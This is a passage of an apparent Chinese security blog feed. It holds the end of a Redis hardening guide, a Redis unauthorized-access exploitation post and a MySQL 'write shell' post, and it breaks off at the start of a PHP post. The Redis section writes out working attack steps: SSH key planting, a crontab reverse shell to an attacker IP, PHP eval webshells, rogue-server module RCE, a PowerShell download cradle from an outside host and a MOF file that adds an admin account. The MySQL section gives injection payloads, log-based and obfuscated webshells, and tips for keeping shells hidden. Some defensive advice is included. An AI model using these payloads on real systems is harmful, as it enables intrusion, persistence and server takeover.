客户端也需要使用此密码来访问 Redis 服务。</p><p>打开 <code>/etc/redis/redis.conf</code> 配置文件:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">requirepass !QE%^E3323BDWEwwwe1839</span><br></pre></td></tr></table></figure><p>确保密码的复杂度，配置完毕后重启服务即可生效。</p></li></ul><h4 id="4-服务运行权限最小化"><a href="#4-服务运行权限最小化" class="headerlink" title="4.服务运行权限最小化"></a>4.服务运行权限最小化</h4><ul><li><p><strong>修改 Redis 服务运行账号</strong></p><p>请以较低权限账号运行 Redis 服务，并禁用该账号的登录权限。以下操作创建了一个无 home 目录权限，且无法登录的普通账号：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">useradd -M -s &#x2F;sbin&#x2F;nologin [username]</span><br></pre></td></tr></table></figure><p><strong>注意</strong>：该操作需要重启 Redis 才能生效。</p></li></ul><h4 id="5-服务精细化授权"><a href="#5-服务精细化授权" class="headerlink" title="5.服务精细化授权"></a>5.服务精细化授权</h4><ul><li><p><strong>隐藏重要命令</strong></p><p>Redis 无权限分离，其管理员账号和普通账号无明显区分。攻击者登录后可执行任意操作，因此需要隐藏以下重要命令：<code>FLUSHDB, FLUSHALL, KEYS,PEXPIRE, DEL, CONFIG, SHUTDOWN, BGREWRITEAOF, BGSAVE, SAVE, SPOP, SREM, RENAME,DEBUG, EVAL</code>。</p><p>另外，在 Redis 2.8.1 及 Redis 3.x （低于 3.0.2） 版本下存在 EVAL 沙箱逃逸漏洞，攻击者可通过该漏洞执行任意 Lua 代码。</p><p>下述配置将 <code>config/flushdb/flushall</code> 设置为空，即禁用该命令；也可设置为一些复杂的、难以猜测的名字。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rename-command CONFIG <span class="string">""</span>rename-command flushall <span class="string">""</span>rename-command flushdb <span class="string">""</span>rename-command shutdown shotdown_test</span><br></pre></td></tr></table></figure><p>保存后，执行 <code>/etc/init.d/redis-server restart</code> 重启生效。</p></li></ul><h4 id="6-安全补丁"><a href="#6-安全补丁" class="headerlink" title="6.安全补丁"></a>6.安全补丁</h4><p>定期关注最新软件版本，并及时升级 Redis 到最新版，防止新漏洞被恶意利用。</p><h1 id="数据库备份类型和常用方法"><a href="#数据库备份类型和常用方法" class="headerlink" title="数据库备份类型和常用方法"></a><strong>数据库备份类型和常用方法</strong></h1><blockquote><p><strong>1、完全备份</strong><br>它可以备份整个数据库，包含用户表、系统表、索引、视图和存储过程等所有数据库对象。<br>但它需要花费更多的时间和空间，所以，一般推荐一周做一次完全备份。</p><p><strong>2、事务日志备份</strong><br>事务日志是一个单独的文件，它记录数据库的改变<br>备份的时候只需要复制自上次备份以来对数据库所做的改变，所以只需要很少的时间；<br>为了使数据库具有鲁棒性(遇到攻击，稳定运行不死机)，推荐每小时甚至更频繁的备份事务日志。</p><p><strong>3、差异备份(增量备份)</strong><br>是只备份数据库一部分的另一种方法，它不使用事务日志，相反，它使用整个数据库的一种新映象；<br>它比最初的完全备份小，因为它只包含自上次完全备份以来所改变的数据库；<br>优点是存储和恢复速度快，推荐每天做一次差异备份。</p><p><strong>4、文件备份</strong><br>数据库可以由硬盘上的许多文件构成，如果这个数据库非常大，并且一个晚上也不能将它备份完；<br>那么可以使用文件备份，每晚备份数据库的一部分；<br>由于一般情况下数据库不会大到必须使用多个文件存储，所以这种备份不是很常用</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Memcached服务加固方案&quot;&gt;&lt;a href=&quot;#Memcached服务加固方案&quot; class=&quot;headerlink&quot; title=&quot;Memcached服务加固方案&quot;&gt;&lt;/a&gt;Memcached服务加固方案&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;Memca
      
    
    </summary>
    
    
      <category term="【1】Web安全" scheme="https://wintrysec.github.io/categories/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>【数据库】Redis未授权访问</title>
    <link href="https://wintrysec.github.io/2020/08/12/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8%E4%B9%8BRedis/"/>
    <id>https://wintrysec.github.io/2020/08/12/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8%E4%B9%8BRedis/</id>
    <published>2020-08-12T15:00:00.000Z</published>
    <updated>2020-08-12T09:52:16.974Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><a href="https://github.com/se55i0n/DBScanner" target="_blank" rel="noopener">未授权访问弱口令扫描</a></p><p><a href="https://blog.csdn.net/ywd1992/article/details/83542955" target="_blank" rel="noopener">Redis安装和配置主从复制</a></p></blockquote><h1 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h1><p><code>Redis</code> 默认情况下，会绑定在 <code>0.0.0.0:6379</code>，这样将会将 <code>Redis</code>  服务暴露到公网上</p><p>如果在没有开启认证的情况下，可以导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis  的数据。</p><p>攻击者在未授权访问 <code>Redis</code> 的情况下可以利用 <code>Redis</code> 的相关方法，可以成功在 Redis  服务器上写入公钥，进而可以使用对应私钥直接登录目标服务器</p><h1 id="利用条件和方法"><a href="#利用条件和方法" class="headerlink" title="利用条件和方法"></a>利用条件和方法</h1><p><strong>条件:</strong></p><blockquote><ol><li><code>redis</code>服务以root账户运行</li><li><code>redis</code>无密码或弱密码进行认证</li><li><code>redis</code>监听在0.0.0.0公网上</li></ol></blockquote><p><strong>方法:</strong></p><blockquote><ul><li>通过 <code>Redis</code> 的 INFO 命令, 可以查看服务器相关的参数和敏感信息, 为攻击者的后续渗透做铺垫</li><li>上传SSH公钥获得SSH登录权限</li><li>通过<code>crontab</code>反弹shell</li><li>Web目录下写<code>webshell</code></li><li>slave主从模式利用</li></ul></blockquote><h1 id="获取info"><a href="#获取info" class="headerlink" title="获取info"></a>获取info</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -A -p 6379 –script redis-info 192.168.1.111<span class="comment">#扫描目标redis info</span></span><br><span class="line"></span><br><span class="line">./redis-cli -h 192.168.1.111</span><br><span class="line">192.168.1.111:6739&gt; info</span><br><span class="line">keys *<span class="comment">#查看所有key</span></span><br><span class="line">get key_name<span class="comment">#查看key的值，例如get password</span></span><br><span class="line">flushall<span class="comment">#删除所有数据</span></span><br><span class="line">del key<span class="comment">#删除键为key的数据</span></span><br></pre></td></tr></table></figure><h1 id="上传SSH公钥获得SSH登录权限"><a href="#上传SSH公钥获得SSH登录权限" class="headerlink" title="上传SSH公钥获得SSH登录权限"></a>上传SSH公钥获得SSH登录权限</h1><p>原理就是在数据库中插入一条数据，将本机的公钥作为value，(key值随意)</p><p>然后通过修改数据库的默认路径为<code>/root/.ssh</code>和默认的缓冲文件<code>authorized.keys</code></p><p>把缓冲的数据保存在文件里，这样就可以在服务器端的<code>/root/.ssh</code>下生一个授权的key</p><p>首先在自己的电脑上生成key:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure><p>将公钥导入<code>key.txt</code>文件（前后用\n\n换行，避免和<code>Redis</code>里其他缓存数据混合）,再把<code>key.txt</code>文件内容写入目标主机的缓冲里</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(<span class="built_in">echo</span> -e <span class="string">"\n\n"</span>; cat id_rsa.pub; <span class="built_in">echo</span> -e <span class="string">"\n\n"</span>) &gt; key.txt</span><br><span class="line"></span><br><span class="line">cat key.txt | ./redis-cli -h 192.168.10.153 -x <span class="built_in">set</span> <span class="built_in">test</span></span><br></pre></td></tr></table></figure><p>连接目标主机的<code>Redis</code>，设置<code>redis</code>的备份路径为/root/.ssh和保存文件名authorized_keys </p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./redis-cli -h 192.168.1.111</span><br><span class="line">config <span class="built_in">set</span> dir /root/.ssh</span><br><span class="line">config <span class="built_in">set</span> dbfilename authorized_keys</span><br><span class="line">keys *</span><br><span class="line">get <span class="built_in">test</span><span class="comment">#查看数据是否存在</span></span><br><span class="line"><span class="comment">#将（缓存里的数据key.txt）保存在服务器硬盘上</span></span><br><span class="line">save</span><br><span class="line"><span class="comment">#SSH 连接目标主机，无需密码即可登录</span></span><br><span class="line">ssh 192.168.1.111</span><br><span class="line"></span><br><span class="line"><span class="comment">#cat /root/.ssh/authorized_keys 可以查看文件内容，是写入的公钥</span></span><br></pre></td></tr></table></figure><h1 id="通过crontab定时任务反弹shell"><a href="#通过crontab定时任务反弹shell" class="headerlink" title="通过crontab定时任务反弹shell"></a>通过<code>crontab</code>定时任务反弹shell</h1><p>原理是和写公钥一样的，只是变换一下写入的内容和路径，数据库名</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#首先在客户端这边监听一个端口，端口不要冲突</span></span><br><span class="line">nc -lv 6666</span><br><span class="line"></span><br><span class="line"><span class="comment">#连接redis，写入反弹shell</span></span><br><span class="line">./redis-cli -h 192.168.1.111</span><br><span class="line"><span class="built_in">set</span> test2 <span class="string">"\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/客户端IP/4444 0&gt;&amp;1\n\n"</span></span><br><span class="line">config <span class="built_in">set</span> dir /var/spool/cron</span><br><span class="line">config <span class="built_in">set</span> dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure><h1 id="Web目录写WebShell"><a href="#Web目录写WebShell" class="headerlink" title="Web目录写WebShell"></a>Web目录写<code>WebShell</code></h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./redis-cli -h 192.168.1.111</span><br><span class="line">config <span class="built_in">set</span> dir /var/www/html</span><br><span class="line"><span class="built_in">set</span> shell <span class="string">"\n\n\n&lt;?php @eval(<span class="variable">$_POST</span>['wintry']);?&gt;\n\n\n"</span></span><br><span class="line">config <span class="built_in">set</span> dbfilename shell.php</span><br><span class="line">save</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -P passwd.txt redis://192.168.1.111<span class="comment">#可以利用hydra爆破redis密码</span></span><br></pre></td></tr></table></figure><h1 id="slave主从复制实现ECE"><a href="#slave主从复制实现ECE" class="headerlink" title="slave主从复制实现ECE"></a>slave主从复制实现ECE</h1><p><strong><code>redis</code>主从复制</strong></p><p>如果当把数据存储在单个<code>Redis</code>的实例中，当读写体量比较大的时候，服务端就很难承受。</p><p>为了应对这种情况，<code>Redis</code>就提供了主从模式，主从模式就是指使用一个<code>redis</code>实例作为主机，其他实例都作为备份机</p><p>其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式</p><p><strong><code>redis</code>模块</strong></p><p> 和<code>mysql</code>类似，<code>redis</code>也支持扩展命令，我们需要编写so文件，来扩展命令。</p><blockquote><p>1、我们伪装成redis数据库，然后受害者将我们的数据库设置为主节点。</p><p>2、我们设置备份文件名为so文件</p><p>3、设置传输方式为全量传输</p><p>4、加载so文件，实现任意命令执行</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./redis-cli -h 192.168.1.111</span><br><span class="line">MODULE LOAD /root/redis-rogue-server/exp.so</span><br><span class="line">system.exec <span class="string">"whoami"</span></span><br></pre></td></tr></table></figure><p>现成的工具，exp利用脚本：<a href="https://github.com/vulhub/redis-rogue-getshell" target="_blank" rel="noopener">redis-rce</a></p><h1 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h1><blockquote><ul><li>使用强密码认证</li><li>降权运行 <code>g roupadd -r redis &amp;&amp; useradd -r -g redis redis</code>，用低权限账户</li><li>限制<code>ip</code>禁止外网访问/修改默认端口   ( <code>redis.conf</code> )</li><li><code>Redis</code>默认不生成日志，可以自己<a href="https://www.freebuf.com/column/158065.html" target="_blank" rel="noopener">配置</a></li></ul></blockquote><p><strong>设置防火墙策略</strong></p><p>如果正常业务中<code>Redis</code>服务需要被其他服务器来访问，可以设置<code>iptables</code>策略仅允许指定的<code>IP</code>来访问<code>Redis</code>服务</p><p><strong>保证 authorized_keys 文件的安全</strong></p><p>为了保证安全，应该阻止其他用户添加新的公钥。</p><p>将 authorized_keys 的权限设置为对拥有者只读，其他用户没有任何权限 ：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chmod 400 ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure><p>为保证 authorized_keys 的权限不会被改掉，还需要设置该文件的 immutable 位权限</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chattr +i ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure><p>但是，用户还可以重命名 ~/.ssh，然后新建新的 ~/.ssh 目录和 authorized_keys 文件。</p><p>要避免这种情况，需要设置 ~./ssh 的 immutable 权限</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chattr +i ~/.ssh</span><br></pre></td></tr></table></figure><h1 id="Windows下的利用"><a href="#Windows下的利用" class="headerlink" title="Windows下的利用"></a>Windows下的利用</h1><p><strong>1、知道网站绝对路径，写WebShell</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">192.168.1.9:6379&gt; config <span class="built_in">set</span> dir D:/phpstudy_pro/WWW</span><br><span class="line">OK</span><br><span class="line">192.168.1.9:6379&gt; config <span class="built_in">set</span> dbfilename shell.php</span><br><span class="line">OK</span><br><span class="line">192.168.1.9:6379&gt; <span class="built_in">set</span> x <span class="string">"&lt;?php phpinfo();?&gt;"</span></span><br><span class="line">OK</span><br><span class="line">192.168.1.9:6379&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure><p><strong>2、写入启动项</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#由于Start Menu之间有空格，因此需要用双引号将路径包含</span></span><br><span class="line">192.168.1.9:6379&gt;config <span class="built_in">set</span> dir <span class="string">"C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/startup/"</span></span><br><span class="line">OK</span><br><span class="line">192.168.1.9:6379&gt;config <span class="built_in">set</span> dbfilename shell.bat</span><br><span class="line">OK</span><br><span class="line">192.168.1.9:6379&gt;<span class="built_in">set</span> x “rnrnpowershell.exe -nop -w hidden -c ”IEX ((new-object net.webclient).downloadstring(‘http://192.168.1.105:80/a’))”rnrn”<span class="comment">#这是CS用团队服务器生成的马</span></span><br><span class="line">OK</span><br><span class="line">192.168.1.9:6379&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure><p><strong>3、写入MOF（2003-r2实验未成功）</strong></p><p>由于不能重启机器也无法获取web目录，想到Mof提权，环境限制只能为<strong>win2003</strong> </p><blockquote><p> mof是windows系统的一个文件（在c:/windows/system32/wbem/mof/nullevt.mof）叫做 ”托管对象格式” </p><p>其作用是每隔五秒就会去监控进程创建和死亡。</p><p>就是用了mysql的root权限了以后，然后使用root权限去执行我们上传的mof。</p><p>隔了一定时间以后这个mof就会被执行，这个mof当中有一段是vbs脚本，这个vbs大多数的是cmd的添加管理员用户的命令。 </p></blockquote><p>也就是说在<code>c:/windows/system32/wbem/mof/</code>目录下的mof文件会每5秒自动执行一次，这样就不需要重启机器就能获取权限了。 </p><p><strong>保存mof.txt文件，内容如下</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#pragma namespace("\\.\root\subscription")</span></span><br><span class="line">instance of __EventFilter as <span class="variable">$EventFilter</span></span><br><span class="line">&#123;</span><br><span class="line">EventNamespace = <span class="string">"Root\Cimv2"</span>;</span><br><span class="line">Name = <span class="string">"filtP2"</span>;</span><br><span class="line">Query = <span class="string">"Select * From __InstanceModificationEvent "</span></span><br><span class="line"><span class="string">"Where TargetInstance Isa "</span>Win32_LocalTime<span class="string">" "</span></span><br><span class="line"><span class="string">"And TargetInstance.Second = 5"</span>;</span><br><span class="line">QueryLanguage = <span class="string">"WQL"</span>;</span><br><span class="line">&#125;;</span><br><span class="line">instance of ActiveScriptEventConsumer as <span class="variable">$Consumer</span></span><br><span class="line">&#123;</span><br><span class="line">Name = <span class="string">"consPCSV2"</span>;</span><br><span class="line">ScriptingEngine = <span class="string">"JScript"</span>;</span><br><span class="line">ScriptText =</span><br><span class="line"><span class="string">"var WSH = new ActiveXObject("</span>WScript.Shell<span class="string">")nWSH.run("</span>net.exe user wintrysec admin666 /add<span class="string">")"</span>;</span><br><span class="line">&#125;;</span><br><span class="line">instance of __FilterToConsumerBinding</span><br><span class="line">&#123;</span><br><span class="line">Consumer = <span class="variable">$Consumer</span>;</span><br><span class="line">Filter = <span class="variable">$EventFilter</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>然后执行</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(<span class="built_in">echo</span> -e <span class="string">"nn"</span>; cat mof.txt; <span class="built_in">echo</span> -e <span class="string">"nn"</span>) &gt; foo.txt</span><br><span class="line">cat foo.txt | redis-cli -h 192.168.1.10 -x <span class="built_in">set</span> mof</span><br><span class="line">redis-cli -h 192.168.1.10</span><br><span class="line">config <span class="built_in">set</span> dir c:/windows/system32/wbem/mof/</span><br><span class="line">config <span class="built_in">set</span> dbfilename wintrysec.mof</span><br><span class="line">save</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/se55i0n/DBScanner&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;未授权访问弱口令扫描&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.cs
      
    
    </summary>
    
    
      <category term="【1】Web安全" scheme="https://wintrysec.github.io/categories/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>【数据库】MySQL写shell</title>
    <link href="https://wintrysec.github.io/2020/08/12/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8%E4%B9%8BMySQL%E5%86%99shell/"/>
    <id>https://wintrysec.github.io/2020/08/12/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8%E4%B9%8BMySQL%E5%86%99shell/</id>
    <published>2020-08-12T14:59:00.000Z</published>
    <updated>2020-08-12T09:53:12.372Z</updated>
    
    <content type="html"><![CDATA[<p><strong>MySQL注入点，用工具对目标站直接写入一句话，需要哪些条件？</strong></p><p>root权限以及网站的绝对路径</p><h1 id="outfile和dumpfile写shell"><a href="#outfile和dumpfile写shell" class="headerlink" title="outfile和dumpfile写shell"></a>outfile和dumpfile写shell</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a><strong>利用条件</strong></h2><p>过滤了单引号into outfile还能用吗？不能，GPC要off才行，可以测试Hex编码</p><blockquote><ol><li>数据库当前用户为root权限；</li><li>知道当前网站的绝对路径；</li><li><code>PHP</code>的<code>GPC</code>为 off状态；(魔术引号，GET，POST，Cookie)</li><li>写入的那个路径存在写入权限。</li></ol></blockquote><h2 id="基于UNION联合查询："><a href="#基于UNION联合查询：" class="headerlink" title="基于UNION联合查询："></a><strong>基于UNION联合查询</strong>：</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?id=1 UNION ALL SELECT 1,<span class="string">'&lt;?php phpinfo();?&gt;'</span>,3 into outfile <span class="string">'C:\info.php'</span>%23</span><br><span class="line">?id=1 UNION ALL SELECT 1,<span class="string">'&lt;?php phpinfo();?&gt;'</span>,3 into dumpfile <span class="string">'C:\info.php'</span>%23</span><br></pre></td></tr></table></figure><h2 id="非联合查询"><a href="#非联合查询" class="headerlink" title="非联合查询"></a><strong>非联合查询</strong></h2><p>当我们无法使用联合查询时，我们可以使用<code>fields terminated by</code>与<code>lines terminated by</code>来写shell</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?id=1 into outfile <span class="string">'C:\info.php'</span> FIELDS TERMINATED BY <span class="string">'&lt;?php phpinfo();?&gt;'</span>%23</span><br></pre></td></tr></table></figure><p><strong>代替空格的方法</strong></p><p>+号，<code>%0a</code>、<code>%0b</code>、<code>%a0</code> 、 /**/ 注释符等</p><h2 id="outfile和dumpfile的区别"><a href="#outfile和dumpfile的区别" class="headerlink" title="outfile和dumpfile的区别"></a><strong><code>outfile</code>和<code>dumpfile</code>的区别</strong></h2><h3 id="outfile"><a href="#outfile" class="headerlink" title="outfile:"></a><code>outfile</code>:</h3><blockquote><p>1、 支持多行数据同时导出</p><p>2、 使用union联合查询时，要保证两侧查询的列数相同 </p><p>3、 会在换行符制表符后面追加反斜杠 </p><p>4、会在末尾追加换行 </p></blockquote><h3 id="dumpfile"><a href="#dumpfile" class="headerlink" title="dumpfile:"></a><code>dumpfile</code>:</h3><blockquote><p>1、 每次只能导出一行数据 </p><p>2、 不会在换行符制表符后面追加反斜杠 </p><p>3、 不会在末尾追加换行 </p></blockquote><p>因此，我们可以使用<code>into dumpfile</code>这个函数来顺利写入二进制文件;</p><p>当然<code>into outfile</code>函数也可以写入二进制文件，只是最终无法生效罢了（追加的反斜杠会使二进制文件无法生效） </p><p>如果服务器端本身的查询语句，结果有多行，但是我们又想使用<code>dump file</code>，应该手动添加 limit 限制</p><h2 id="突破secure-file-priv写shell"><a href="#突破secure-file-priv写shell" class="headerlink" title="突破secure-file-priv写shell"></a><strong>突破<code>secure-file-priv</code>写shell</strong></h2><p><code>MySQL</code>的<code>secure-file-priv</code>参数是用来限制LOAD DATA, SELECT … <code>OUTFILE</code>, and LOAD_FILE()传到哪个指定目录的。</p><p>当<code>secure_file_priv</code>的值没有具体值时，表示不对<code>MySQL</code>的导入|导出做限制，如果是null，表示<code>MySQL</code>不允许导入导出。</p><p>而且在<code>mysql 5.6.34</code>版本以后 <code>secure_file_priv</code> 的值默认为NULL。并且无法用<code>SQL</code>语句对其进行修改。</p><h2 id="基于日志写shell"><a href="#基于日志写shell" class="headerlink" title="基于日志写shell"></a><strong>基于日志写shell</strong></h2><p>（ <code>outfile</code>被禁止，或者写入文件被拦截，没写权限 ，有root权限）</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">'%general%'</span>;<span class="comment">--查看配置，日志是否开启，和mysql默认log地址(记下原地址方便恢复)</span></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log = <span class="keyword">on</span>;<span class="comment">--开启日志监测，默认关闭(如果一直开文件会很大的)</span></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file = <span class="string">'/var/www/html/info.php'</span>;<span class="comment">--设置日志路径</span></span><br><span class="line"><span class="keyword">select</span> <span class="string">'&lt;?php phpinfo();?&gt;'</span>;<span class="comment">--执行查询，写入shell</span></span><br><span class="line"><span class="comment">--结束后，恢复日志路径，关闭日志监测</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--SQL查询免杀shell</span></span><br><span class="line"><span class="keyword">select</span> <span class="string">"&lt;?php $sl = create_function('', @$_REQUEST['klion']);$sl();?&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> <span class="string">"&lt;?php $p = array('f'=&gt;'a','pffff'=&gt;'s','e'=&gt;'fffff','lfaaaa'=&gt;'r','nnnnn'=&gt;'t');$a = array_keys($p);$_=$p['pffff'].$p['pffff'].$a[2];$_= 'a'.$_.'rt';$_(base64_decode($_REQUEST['username']));?&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">---------------</span></span><br><span class="line"><span class="comment">--慢查询写shell</span></span><br><span class="line"><span class="comment">---------------</span></span><br><span class="line">为什么要用慢查询写呢？上边说过开启日志监测后文件会很大，网站访问量大的话我们写的shell会出错</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">'%slow_query_log%'</span>;<span class="comment">--查看慢查询信息</span></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> slow_query_log=<span class="number">1</span>;<span class="comment">--启用慢查询日志(默认禁用)</span></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> slow_query_log_file=<span class="string">'C:\\phpStudy\\WWW\\shell.php'</span>;<span class="comment">--修改日志文件路径</span></span><br><span class="line"><span class="keyword">select</span> <span class="string">'&lt;?php @eval($_POST[abc]);?&gt;'</span> <span class="keyword">or</span> <span class="keyword">sleep</span>(<span class="number">11</span>);<span class="comment">--写shell</span></span><br></pre></td></tr></table></figure><h2 id="慢查询补充"><a href="#慢查询补充" class="headerlink" title="慢查询补充"></a><strong>慢查询补充</strong></h2><p>因为是用的慢查询日志，所以说只有当查询语句执行的时间要超过系统默认的时间时,该语句才会被记入进慢查询日志。 </p><p>一般都是通过<code>long_query_time</code>选项来设置这个时间值，时间以秒为单位，可以精确到微秒。</p><p>如果查询时间超过了这个时间值（默认为10秒），这个查询语句将被记录到慢查询日志中 </p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">global</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">'%long_query_time%'</span><span class="comment">--查看服务器默认时间值</span></span><br></pre></td></tr></table></figure><p>通常情况下执行<code>sql</code>语句时的执行时间一般不会超过10s，所以说这个日志文件应该是比较小的，而且默认也是禁用状态，不会引起管理员的察觉 </p><p>拿到shell后上传一个新的shell，删掉原来shell，新shell做隐藏，这样shell可能还能活的时间长些</p><p>像这种东西还是比较适合那些集成环境,比如,<code>appserv</code>,<code>xampp</code>…因为权限全部都映射到同一个系统用户上了,如果是win平台,权限通常都比较高 </p><p><strong>其它方法</strong>：通过构造联合查询语句得到网站管理员的账户和密码，然后扫后台登录后台，找上传点 <code>GetShell</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;MySQL注入点，用工具对目标站直接写入一句话，需要哪些条件？&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;root权限以及网站的绝对路径&lt;/p&gt;
&lt;h1 id=&quot;outfile和dumpfile写shell&quot;&gt;&lt;a href=&quot;#outfile和dumpfile写sh
      
    
    </summary>
    
    
      <category term="【1】Web安全" scheme="https://wintrysec.github.io/categories/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>PHP安全特性</title>
    <link href="https://wintrysec.github.io/2020/08/12/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/PHP%E5%AE%89%E5%85%A8%E7%89%B9%E6%80%A7/"/>
    <id>https://wintrysec.github.io/2020/08/12/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/PHP%E5%AE%89%E5%85%A8%E7%89%B9%E6%80%A7/</id>
    <published>2020-08-12T14:06:00.000Z</published>
    <updated>2020-08-12T09:24:26.697Z</updated>
    
    <content type="html"><![CDATA[<h1 id="何为代码审计？"><a href="#何为代码审计？" class="headerlink" title="何为代码审计？"></a>何为代码审计？</h1><p>代码审计（Code audit）是一种以发现程序错误，安全漏洞和违反程序规范为目标的源代码分析。</p><p>内容包括：</p><blockquote><ol><li>前后台分离的运行架构</li><li>Web服务的目录权限分类</li><li>认证会话与应用平台的结合</li><li>数据库的配置规范</li><li>SQL语句的编写规范</li><li>Web服务的权限配置</li><li>对抗爬虫引擎的处理措施</li></ol></blockquote><h1 id="审计关键点"><a href="#审计关键点" class="headerlink" title="审计关键点"></a>审计关键点</h1><blockquote><p><strong>！！！首先要搞清楚目录结构，程序有哪些功能，查看 config 配置文件！！！</strong></p><p>一、如果是CMS，搜索公开漏洞，对比同版本文件差异</p><p>二、查看敏感函数、回溯变量，判断变量在调用前是否经过安全过滤</p><p>三、查看公共函数、过滤函数是否存在漏洞和可绕过的点</p><p>​        函数命名上会包含<code>common</code>、<code>function</code>、<code>filter</code>、<code>safe</code>、<code>check</code>等关键词</p><p>四、查看敏感功能点，正向追踪变量传递过程，重点关注用户可控变量</p></blockquote><p><a href="https://wooyun.js.org/drops/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8%E6%80%BB%E7%BB%93.html" target="_blank" rel="noopener">参考链接</a></p><h1 id="你用什么工具提高效率？"><a href="#你用什么工具提高效率？" class="headerlink" title="你用什么工具提高效率？"></a>你用什么工具提高效率？</h1><p>Fortify</p><p><strong>submile代码审计插件</strong></p><p><a href="https://github.com/5alt/VulHint" target="_blank" rel="noopener">VulHint</a></p><p><a href="https://github.com/WangYihang/Find-PHP-Vulnerabilities" target="_blank" rel="noopener">Find-PHP-Vulnerabilities</a> </p><h3 id="为什么有的时候没有错误回显，用php举例"><a href="#为什么有的时候没有错误回显，用php举例" class="headerlink" title="为什么有的时候没有错误回显，用php举例"></a>为什么有的时候没有错误回显，用php举例</h3><blockquote><p>php的配置文件php.ini进行了修改，display_errors = On 修改为 display_errors = off时候就没有报错提示。 </p><p>在php脚本开头添加error_reporting(0); 也可以达到关闭报错的作用 </p><p>除了上面的，还可以在执行语句前面添加@ </p></blockquote><h1 id="php-ini可以设置哪些安全特性"><a href="#php-ini可以设置哪些安全特性" class="headerlink" title="php.ini可以设置哪些安全特性"></a>php.ini可以设置哪些安全特性</h1><h3 id="关闭错误回显"><a href="#关闭错误回显" class="headerlink" title="关闭错误回显"></a><strong>关闭错误回显</strong></h3><p>防止利用错误信息反馈获取网站敏感信息</p><h3 id="设置open-basedir-var-www-html"><a 